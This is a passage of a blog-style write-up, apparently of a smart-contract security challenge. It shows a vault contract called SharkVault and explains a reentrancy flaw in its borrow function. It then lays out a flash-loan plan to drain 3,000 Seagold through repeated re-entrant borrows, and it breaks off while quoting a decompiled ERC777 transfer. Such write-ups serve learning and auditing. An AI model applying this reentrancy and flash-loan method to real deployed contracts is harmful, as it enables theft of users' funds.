+</span></span><span class="line"><span class="cl">        <span class="n">IERC20</span> <span class="n">seagold</span> <span class="o">=</span> <span class="n">IERC20</span><span class="p">(</span><span class="n">vault</span><span class="p">.</span><span class="n">seagold</span><span class="p">());</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">        <span class="n">console</span><span class="p">.</span><span class="n">logAddress</span><span class="p">(</span><span class="kt">address</span><span class="p">(</span><span class="n">gold</span><span class="p">));</span>
+</span></span><span class="line"><span class="cl">        <span class="n">console</span><span class="p">.</span><span class="n">logAddress</span><span class="p">(</span><span class="kt">address</span><span class="p">(</span><span class="n">seagold</span><span class="p">));</span>
+</span></span><span class="line"><span class="cl">        <span class="n">console</span><span class="p">.</span><span class="n">logUint</span><span class="p">(</span><span class="n">gold</span><span class="p">.</span><span class="n">balanceOf</span><span class="p">(</span><span class="kt">address</span><span class="p">(</span><span class="n">vault</span><span class="p">)));</span>
+</span></span><span class="line"><span class="cl">        <span class="n">console</span><span class="p">.</span><span class="n">logUint</span><span class="p">(</span><span class="n">seagold</span><span class="p">.</span><span class="n">balanceOf</span><span class="p">(</span><span class="kt">address</span><span class="p">(</span><span class="n">vault</span><span class="p">)));</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">        <span class="n">vm</span><span class="p">.</span><span class="n">stopBroadcast</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span></span></span></code></pre></div></div><div class="opacity-0 transition group-hover/code:opacity-100 flex gap-1 absolute m-[11px] right-0 top-0">
+    <button
+      class="code-copy-btn group/copybtn transition-all active:opacity-50 bg-primary-700/5 border border-black/5 text-gray-600 hover:text-gray-900 rounded-md p-1.5 dark:bg-primary-300/10 dark:border-white/10 dark:text-gray-400 dark:hover:text-gray-50"
+      title="Copy code"
+    >
+      <div class="group-[.copied]/copybtn:hidden copy-icon pointer-events-none h-4 w-4"></div>
+      <div class="hidden group-[.copied]/copybtn:block success-icon pointer-events-none h-4 w-4"></div>
+    </button>
+  </div>
+</div>
+<p>which gives me the following output :</p>
+<p><img src="/images/d77a8fc9-bff8-4e31-8f60-59bb6cbce852.png" alt="" loading="lazy" /></p>
+<p>So this is our target to still !</p>
+<p>Now here is the vault contract:</p>
+<div class="code-block relative mt-6 first:mt-0 group/code"><div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-solidity" data-lang="solidity"><span class="line"><span class="cl"><span class="c1">// SPDX-License-Identifier: MIT
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="k">pragma solidity</span> <span class="o">^</span><span class="mi">0</span><span class="p">.</span><span class="mi">8</span><span class="p">.</span><span class="mi">19</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="s">&#34;@openzeppelin/contracts/interfaces/IERC20.sol&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="kd">contract</span> <span class="nc">SharkVault</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="c1">// The Shark charges predatory interest rates...
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="kt">uint256</span> <span class="k">constant</span> <span class="k">public</span> <span class="n">INTEREST_RATE_PERCENT</span> <span class="o">=</span> <span class="mi">1</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="n">IERC20</span> <span class="k">immutable</span> <span class="k">public</span> <span class="n">gold</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="n">IERC20</span> <span class="k">immutable</span> <span class="k">public</span> <span class="n">seagold</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="kd">struct</span> <span class="nc">LoanAccount</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="kt">uint256</span> <span class="n">depositedGold</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">        <span class="kt">uint256</span> <span class="n">borrowedSeagold</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">        <span class="kt">uint256</span> <span class="n">lastBlock</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="kd">mapping</span><span class="p">(</span><span class="kt">address</span> <span class="o">=&gt;</span> <span class="n">LoanAccount</span><span class="p">)</span> <span class="k">private</span> <span class="n">accounts</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="kd">constructor</span><span class="p">(</span>
+</span></span><span class="line"><span class="cl">        <span class="n">IERC20</span> <span class="n">_gold</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">        <span class="n">IERC20</span> <span class="n">_seagold</span>
+</span></span><span class="line"><span class="cl">    <span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="n">gold</span> <span class="o">=</span>  <span class="n">_gold</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">        <span class="n">seagold</span> <span class="o">=</span> <span class="n">_seagold</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="cm">/**
+</span></span></span><span class="line"><span class="cl"><span class="cm">     * @notice Deposit gold as collateral. 
+</span></span></span><span class="line"><span class="cl"><span class="cm">     * @param _amount Amount of gold to deposit.
+</span></span></span><span class="line"><span class="cl"><span class="cm">     * @dev Gold must be approved for transfer beforehand.
+</span></span></span><span class="line"><span class="cl"><span class="cm">     */</span>
+</span></span><span class="line"><span class="cl">    <span class="kd">function</span> <span class="nf">depositGold</span><span class="p">(</span><span class="kt">uint256</span> <span class="n">_amount</span><span class="p">)</span> <span class="k">external</span> <span class="k">payable</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">        <span class="n">accounts</span><span class="p">[</span><span class="nb">msg</span><span class="p">.</span><span class="nb">sender</span><span class="p">].</span><span class="n">depositedGold</span> <span class="o">+=</span> <span class="n">_amount</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">        <span class="n">gold</span><span class="p">.</span><span class="n">transferFrom</span><span class="p">(</span><span class="nb">msg</span><span class="p">.</span><span class="nb">sender</span><span class="p">,</span> <span class="kt">address</span><span class="p">(</span><span class="nb">this</span><span class="p">),</span> <span class="n">_amount</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="cm">/**
+</span></span></span><span class="line"><span class="cl"><span class="cm">     * @notice Withdraw gold collateral.
+</span></span></span><span class="line"><span class="cl"><span class="cm">     * @param _amount Amount of gold to withdraw.
+</span></span></span><span class="line"><span class="cl"><span class="cm">     * @dev Any existing seagold loan must still be 
+</span></span></span><span class="line"><span class="cl"><span class="cm">     * sufficiently collateralized.
+</span></span></span><span class="line"><span class="cl"><span class="cm">     */</span>
+</span></span><span class="line"><span class="cl">    <span class="kd">function</span> <span class="nf">withdrawGold</span><span class="p">(</span><span class="kt">uint256</span> <span class="n">_amount</span><span class="p">)</span> <span class="k">external</span> <span class="k">payable</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">        <span class="n">LoanAccount</span> <span class="k">memory</span> <span class="n">account</span> <span class="o">=</span> <span class="n">updatedAccount</span><span class="p">(</span><span class="nb">msg</span><span class="p">.</span><span class="nb">sender</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">        <span class="n">account</span><span class="p">.</span><span class="n">depositedGold</span> <span class="o">-=</span> <span class="n">_amount</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">        <span class="nb">require</span><span class="p">(</span><span class="n">_hasEnoughCollateral</span><span class="p">(</span><span class="n">account</span><span class="p">),</span> <span class="s">&#34;Undercollateralized $SEAGLD loan&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">        <span class="n">accounts</span><span class="p">[</span><span class="nb">msg</span><span class="p">.</span><span class="nb">sender</span><span class="p">]</span> <span class="o">=</span> <span class="n">account</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">        <span class="n">gold</span><span class="p">.</span><span class="nb">transfer</span><span class="p">(</span><span class="nb">msg</span><span class="p">.</span><span class="nb">sender</span><span class="p">,</span> <span class="n">_amount</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="cm">/**
+</span></span></span><span class="line"><span class="cl"><span class="cm">     * @notice Borrow seagold.
+</span></span></span><span class="line"><span class="cl"><span class="cm">     * @param _amount Amount of seagold to borrow.
+</span></span></span><span class="line"><span class="cl"><span class="cm">     * @dev Seagold loan have be suffciently collateralized 
+</span></span></span><span class="line"><span class="cl"><span class="cm">     * by previously deposited gold.
+</span></span></span><span class="line"><span class="cl"><span class="cm">     */</span>
+</span></span><span class="line"><span class="cl">    <span class="kd">function</span> <span class="nf">borrow</span><span class="p">(</span><span class="kt">uint256</span> <span class="n">_amount</span><span class="p">)</span> <span class="k">external</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">        <span class="n">LoanAccount</span> <span class="k">memory</span> <span class="n">borrowerAccount</span> <span class="o">=</span> <span class="n">updatedAccount</span><span class="p">(</span><span class="nb">msg</span><span class="p">.</span><span class="nb">sender</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">        <span class="n">borrowerAccount</span><span class="p">.</span><span class="n">borrowedSeagold</span> <span class="o">+=</span> <span class="n">_amount</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">        <span class="c1">// Fail if insufficient remaining balance of $SEAGOLD
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="kt">uint256</span> <span class="n">seagoldBalance</span> <span class="o">=</span> <span class="n">seagold</span><span class="p">.</span><span class="n">balanceOf</span><span class="p">(</span><span class="kt">address</span><span class="p">(</span><span class="nb">this</span><span class="p">));</span>
+</span></span><span class="line"><span class="cl">        <span class="nb">require</span><span class="p">(</span><span class="n">_amount</span> <span class="o">&lt;=</span> <span class="n">seagoldBalance</span><span class="p">,</span> <span class="s">&#34;Insufficient $SEAGLD to lend&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">        <span class="c1">// Fail if borrower has insufficient gold collateral
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="nb">require</span><span class="p">(</span><span class="n">_hasEnoughCollateral</span><span class="p">(</span><span class="n">borrowerAccount</span><span class="p">),</span> <span class="s">&#34;Undercollateralized $SEAGLD loan&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">        <span class="c1">// Transfer $SEAGOLD and update records
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="n">seagold</span><span class="p">.</span><span class="nb">transfer</span><span class="p">(</span><span class="nb">msg</span><span class="p">.</span><span class="nb">sender</span><span class="p">,</span> <span class="n">_amount</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">        <span class="n">accounts</span><span class="p">[</span><span class="nb">msg</span><span class="p">.</span><span class="nb">sender</span><span class="p">]</span> <span class="o">=</span> <span class="n">borrowerAccount</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="cm">/**
+</span></span></span><span class="line"><span class="cl"><span class="cm">     * @notice Repay borrowed seagold.
+</span></span></span><span class="line"><span class="cl"><span class="cm">     * @param _amount Amount of seagold to repay.
+</span></span></span><span class="line"><span class="cl"><span class="cm">     * @dev Seagold must be approved for transfer beforehand.
+</span></span></span><span class="line"><span class="cl"><span class="cm">     */</span>
+</span></span><span class="line"><span class="cl">    <span class="kd">function</span> <span class="nf">repay</span><span class="p">(</span><span class="kt">uint256</span> <span class="n">_amount</span><span class="p">)</span> <span class="k">external</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">        <span class="n">LoanAccount</span> <span class="k">memory</span> <span class="n">account</span> <span class="o">=</span> <span class="n">updatedAccount</span><span class="p">(</span><span class="nb">msg</span><span class="p">.</span><span class="nb">sender</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">        <span class="n">account</span><span class="p">.</span><span class="n">borrowedSeagold</span> <span class="o">-=</span> <span class="n">_amount</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">        <span class="n">accounts</span><span class="p">[</span><span class="nb">msg</span><span class="p">.</span><span class="nb">sender</span><span class="p">]</span> <span class="o">=</span> <span class="n">account</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">        <span class="n">seagold</span><span class="p">.</span><span class="n">transferFrom</span><span class="p">(</span><span class="nb">msg</span><span class="p">.</span><span class="nb">sender</span><span class="p">,</span> <span class="kt">address</span><span class="p">(</span><span class="nb">this</span><span class="p">),</span> <span class="n">_amount</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="cm">/**
+</span></span></span><span class="line"><span class="cl"><span class="cm">     * @notice Liquidate an existing undercollateralized loan. 
+</span></span></span><span class="line"><span class="cl"><span class="cm">     * The smart contract effectively seizes the gold collateral.
+</span></span></span><span class="line"><span class="cl"><span class="cm">     * @param _borrower Owner of the loan.
+</span></span></span><span class="line"><span class="cl"><span class="cm">     */</span>
+</span></span><span class="line"><span class="cl">    <span class="kd">function</span> <span class="nf">liquidate</span><span class="p">(</span><span class="kt">address</span> <span class="n">_borrower</span><span class="p">)</span> <span class="k">external</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">        <span class="n">LoanAccount</span> <span class="k">memory</span> <span class="n">borrowerAccount</span> <span class="o">=</span> <span class="n">updatedAccount</span><span class="p">(</span><span class="n">_borrower</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">        <span class="nb">require</span><span class="p">(</span><span class="o">!</span><span class="n">_hasEnoughCollateral</span><span class="p">(</span><span class="n">borrowerAccount</span><span class="p">),</span> <span class="s">&#34;Borrower has good collateral&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">        <span class="k">delete</span> <span class="n">accounts</span><span class="p">[</span><span class="n">_borrower</span><span class="p">];</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="cm">/**
+</span></span></span><span class="line"><span class="cl"><span class="cm">     * @notice Get the loan account of a user, with updated interest.
+</span></span></span><span class="line"><span class="cl"><span class="cm">     * @param _accountOwner Owner of the loan.
+</span></span></span><span class="line"><span class="cl"><span class="cm">     */</span>
+</span></span><span class="line"><span class="cl">    <span class="kd">function</span> <span class="nf">updatedAccount</span><span class="p">(</span>
+</span></span><span class="line"><span class="cl">        <span class="kt">address</span> <span class="n">_accountOwner</span>
+</span></span><span class="line"><span class="cl">    <span class="p">)</span> <span class="k">public</span> <span class="k">view</span> <span class="k">returns</span> <span class="p">(</span><span class="n">LoanAccount</span> <span class="k">memory</span> <span class="n">account</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">        <span class="n">account</span> <span class="o">=</span> <span class="n">accounts</span><span class="p">[</span><span class="n">_accountOwner</span><span class="p">];</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="p">(</span><span class="n">account</span><span class="p">.</span><span class="n">borrowedSeagold</span> <span class="o">&gt;</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">            <span class="kt">uint256</span> <span class="n">blockDelta</span> <span class="o">=</span> <span class="nb">block</span><span class="p">.</span><span class="nb">number</span> <span class="o">-</span> <span class="n">account</span><span class="p">.</span><span class="n">lastBlock</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">            <span class="kt">uint256</span> <span class="n">interest</span> <span class="o">=</span> <span class="n">account</span><span class="p">.</span><span class="n">borrowedSeagold</span> <span class="o">*</span> <span class="n">blockDelta</span> 
+</span></span><span class="line"><span class="cl">                <span class="o">*</span> <span class="n">INTEREST_RATE_PERCENT</span> <span class="o">/</span> <span class="mi">100</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">            <span class="n">account</span><span class="p">.</span><span class="n">depositedGold</span> <span class="o">=</span> <span class="p">(</span><span class="n">account</span><span class="p">.</span><span class="n">depositedGold</span> <span class="o">&gt;=</span> <span class="n">interest</span><span class="p">)</span> 
+</span></span><span class="line"><span class="cl">                <span class="o">?</span> <span class="n">account</span><span class="p">.</span><span class="n">depositedGold</span> <span class="o">-</span> <span class="n">interest</span> 
+</span></span><span class="line"><span class="cl">                <span class="o">:</span> <span class="mi">0</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">        <span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">        <span class="n">account</span><span class="p">.</span><span class="n">lastBlock</span> <span class="o">=</span> <span class="nb">block</span><span class="p">.</span><span class="nb">number</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="cm">/**
+</span></span></span><span class="line"><span class="cl"><span class="cm">     * @dev Returns true if `_account` is sufficiently collateralized by gold.
+</span></span></span><span class="line"><span class="cl"><span class="cm">     * Collateral ratio =&gt; 1 GOLD : 0.75 SEAGOLD
+</span></span></span><span class="line"><span class="cl"><span class="cm">     */</span>
+</span></span><span class="line"><span class="cl">    <span class="kd">function</span> <span class="nf">_hasEnoughCollateral</span><span class="p">(</span><span class="n">LoanAccount</span> <span class="k">memory</span> <span class="n">_account</span><span class="p">)</span> <span class="k">private</span> <span class="k">pure</span> <span class="k">returns</span> <span class="p">(</span><span class="kt">bool</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="p">(</span><span class="mi">3</span> <span class="o">*</span> <span class="n">_account</span><span class="p">.</span><span class="n">depositedGold</span> <span class="o">&gt;=</span> <span class="mi">4</span> <span class="o">*</span> <span class="n">_account</span><span class="p">.</span><span class="n">borrowedSeagold</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">        
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="p">}</span></span></span></code></pre></div></div><div class="opacity-0 transition group-hover/code:opacity-100 flex gap-1 absolute m-[11px] right-0 top-0">
+    <button
+      class="code-copy-btn group/copybtn transition-all active:opacity-50 bg-primary-700/5 border border-black/5 text-gray-600 hover:text-gray-900 rounded-md p-1.5 dark:bg-primary-300/10 dark:border-white/10 dark:text-gray-400 dark:hover:text-gray-50"
+      title="Copy code"
+    >
+      <div class="group-[.copied]/copybtn:hidden copy-icon pointer-events-none h-4 w-4"></div>
+      <div class="hidden group-[.copied]/copybtn:block success-icon pointer-events-none h-4 w-4"></div>
+    </button>
+  </div>
+</div>
+<p>Since we are supposed to take advantage of a reentrancy attack, I’m looking for any miss ordered <code>[checks → internal state change → outside communication]</code> patern in the contract. In other word, I want to find something in the contract that update the internal state logic of the contract after talking with the outside world.</p>
+<p>And here we have it :</p>
+<div class="code-block relative mt-6 first:mt-0 group/code"><div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-solidity" data-lang="solidity"><span class="line"><span class="cl"> <span class="kd">function</span> <span class="nf">borrow</span><span class="p">(</span><span class="kt">uint256</span> <span class="n">_amount</span><span class="p">)</span> <span class="k">external</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">        <span class="n">LoanAccount</span> <span class="k">memory</span> <span class="n">borrowerAccount</span> <span class="o">=</span> <span class="n">updatedAccount</span><span class="p">(</span><span class="nb">msg</span><span class="p">.</span><span class="nb">sender</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">        <span class="n">borrowerAccount</span><span class="p">.</span><span class="n">borrowedSeagold</span> <span class="o">+=</span> <span class="n">_amount</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">        <span class="c1">// Fail if insufficient remaining balance of $SEAGOLD
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="kt">uint256</span> <span class="n">seagoldBalance</span> <span class="o">=</span> <span class="n">seagold</span><span class="p">.</span><span class="n">balanceOf</span><span class="p">(</span><span class="kt">address</span><span class="p">(</span><span class="nb">this</span><span class="p">));</span>
+</span></span><span class="line"><span class="cl">        <span class="nb">require</span><span class="p">(</span><span class="n">_amount</span> <span class="o">&lt;=</span> <span class="n">seagoldBalance</span><span class="p">,</span> <span class="s">&#34;Insufficient $SEAGLD to lend&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">        <span class="c1">// Fail if borrower has insufficient gold collateral
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="nb">require</span><span class="p">(</span><span class="n">_hasEnoughCollateral</span><span class="p">(</span><span class="n">borrowerAccount</span><span class="p">),</span> <span class="s">&#34;Undercollateralized $SEAGLD loan&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">        <span class="c1">// Transfer $SEAGOLD and update records
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="n">seagold</span><span class="p">.</span><span class="nb">transfer</span><span class="p">(</span><span class="nb">msg</span><span class="p">.</span><span class="nb">sender</span><span class="p">,</span> <span class="n">_amount</span><span class="p">);</span> <span class="o">&lt;==================</span>
+</span></span><span class="line"><span class="cl">        <span class="n">accounts</span><span class="p">[</span><span class="nb">msg</span><span class="p">.</span><span class="nb">sender</span><span class="p">]</span> <span class="o">=</span> <span class="n">borrowerAccount</span><span class="p">;</span> <span class="o">&lt;=================</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="p">}</span></span></span></code></pre></div></div><div class="opacity-0 transition group-hover/code:opacity-100 flex gap-1 absolute m-[11px] right-0 top-0">
+    <button
+      class="code-copy-btn group/copybtn transition-all active:opacity-50 bg-primary-700/5 border border-black/5 text-gray-600 hover:text-gray-900 rounded-md p-1.5 dark:bg-primary-300/10 dark:border-white/10 dark:text-gray-400 dark:hover:text-gray-50"
+      title="Copy code"
+    >
+      <div class="group-[.copied]/copybtn:hidden copy-icon pointer-events-none h-4 w-4"></div>
+      <div class="hidden group-[.copied]/copybtn:block success-icon pointer-events-none h-4 w-4"></div>
+    </button>
+  </div>
+</div>
+<p>Those last two line are very dangerous since transfer can be done to any malicious contract that will recall the borrow function before the <code>accounnts[msg.sender]</code> state is updated!</p>
+<p>The first line of the function calls <code>updatedAccount</code> :</p>
+<div class="code-block relative mt-6 first:mt-0 group/code"><div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-solidity" data-lang="solidity"><span class="line"><span class="cl"><span class="kd">function</span> <span class="nf">updatedAccount</span><span class="p">(</span>
+</span></span><span class="line"><span class="cl">        <span class="kt">address</span> <span class="n">_accountOwner</span>
+</span></span><span class="line"><span class="cl">    <span class="p">)</span> <span class="k">public</span> <span class="k">view</span> <span class="k">returns</span> <span class="p">(</span><span class="n">LoanAccount</span> <span class="k">memory</span> <span class="n">account</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">        <span class="n">account</span> <span class="o">=</span> <span class="n">accounts</span><span class="p">[</span><span class="n">_accountOwner</span><span class="p">];</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="p">(</span><span class="n">account</span><span class="p">.</span><span class="n">borrowedSeagold</span> <span class="o">&gt;</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">            <span class="kt">uint256</span> <span class="n">blockDelta</span> <span class="o">=</span> <span class="nb">block</span><span class="p">.</span><span class="nb">number</span> <span class="o">-</span> <span class="n">account</span><span class="p">.</span><span class="n">lastBlock</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">            <span class="kt">uint256</span> <span class="n">interest</span> <span class="o">=</span> <span class="n">account</span><span class="p">.</span><span class="n">borrowedSeagold</span> <span class="o">*</span> <span class="n">blockDelta</span> 
+</span></span><span class="line"><span class="cl">                <span class="o">*</span> <span class="n">INTEREST_RATE_PERCENT</span> <span class="o">/</span> <span class="mi">100</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">            <span class="n">account</span><span class="p">.</span><span class="n">depositedGold</span> <span class="o">=</span> <span class="p">(</span><span class="n">account</span><span class="p">.</span><span class="n">depositedGold</span> <span class="o">&gt;=</span> <span class="n">interest</span><span class="p">)</span> 
+</span></span><span class="line"><span class="cl">                <span class="o">?</span> <span class="n">account</span><span class="p">.</span><span class="n">depositedGold</span> <span class="o">-</span> <span class="n">interest</span> 
+</span></span><span class="line"><span class="cl">                <span class="o">:</span> <span class="mi">0</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">        <span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">        <span class="n">account</span><span class="p">.</span><span class="n">lastBlock</span> <span class="o">=</span> <span class="nb">block</span><span class="p">.</span><span class="nb">number</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="p">}</span></span></span></code></pre></div></div><div class="opacity-0 transition group-hover/code:opacity-100 flex gap-1 absolute m-[11px] right-0 top-0">
+    <button
+      class="code-copy-btn group/copybtn transition-all active:opacity-50 bg-primary-700/5 border border-black/5 text-gray-600 hover:text-gray-900 rounded-md p-1.5 dark:bg-primary-300/10 dark:border-white/10 dark:text-gray-400 dark:hover:text-gray-50"
+      title="Copy code"
+    >
+      <div class="group-[.copied]/copybtn:hidden copy-icon pointer-events-none h-4 w-4"></div>
+      <div class="hidden group-[.copied]/copybtn:block success-icon pointer-events-none h-4 w-4"></div>
+    </button>
+  </div>
+</div>
+<p>but this call presuppose that <code>account = accounts[_accountOwner];</code> is the correct value, which we know is wrong since we can call withdraw as many time as we want without changing the <code>accounts[msg.sender]</code> . In order to create an attack, first we need so GOLD collateral. Let’s see how many GOLD we can borrow from the flash lender:</p>
+<p><img src="/images/890f84cd-9c23-471d-91f8-eb71c84fa3df.png" alt="" loading="lazy" /></p>
+<p>So, 1 000 Gold token.</p>
+<p>And we want to still 3 000 SeaGold.</p>
+<p>It is said that : For every <code>1000</code> Gold deposited, users can borrow up to <code>75</code> Seagold.</p>
+<p>So we’ll be able to <code>borrow</code> 750 Seagold on each call which is perfet since 3 000 / 750 = 4 !</p>
+<p>So, here are the step I’m going to implement;</p>
+<ol>
+<li>Deposit the <code>1000</code> Gold from the Flashloan contract into the SharkVault contract</li>
+<li>Call <code>borrow()</code> 750 SeaGold x4 thanks to the contract breach</li>
+<li>Make a last <code>borrow()</code> of 0 SeaGold so I don’t have to repay anything</li>
+<li>Withdraw the <code>1000</code> Gold from the SharkVault contract and repay back the Flashloan contract</li>
+</ol>
+<p>Now it still remains one problem, how to take advantage of the seagold transfer method ?</p>
+<p>looking at the decompiled version of the function from goerli scan :</p>
+<div class="code-block relative mt-6 first:mt-0 group/code"><div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-solidity" data-lang="solidity"><span class="line"><span class="cl"><span class="n">def</span> <span class="nb">transfer</span><span class="p">(</span><span class="kt">address</span> <span class="n">_to</span><span class="p">,</span> <span class="kt">uint256</span> <span class="n">_value</span><span class="p">)</span> <span class="k">payable</span><span class="o">:</span> 
+</span></span><span class="line"><span class="cl">  <span class="nb">require</span> <span class="n">calldata</span><span class="p">.</span><span class="n">size</span> <span class="o">-</span> <span class="mi">4</span> <span class="o">&gt;=</span><span class="err">ΓÇ▓</span> <span class="mi">64</span>
+</span></span><span class="line"><span class="cl">  <span class="nb">require</span> <span class="n">_to</span> <span class="o">==</span> <span class="n">_to</span>
+</span></span><span class="line"><span class="cl">  <span class="nb">require</span> <span class="n">_value</span> <span class="o">==</span> <span class="n">_value</span>
+</span></span><span class="line"><span class="cl">  <span class="k">if</span> <span class="n">not</span> <span class="n">caller</span><span class="o">:</span>
+</span></span><span class="line"><span class="cl">      <span class="nb">revert</span> <span class="n">with</span> <span class="mi">0</span><span class="p">,</span> <span class="s">&#39;ERC777: transfer from the zero address&#39;</span>
+</span></span><span class="line"><span class="cl">  <span class="k">if</span> <span class="n">not</span> <span class="n">_to</span><span class="o">:</span>
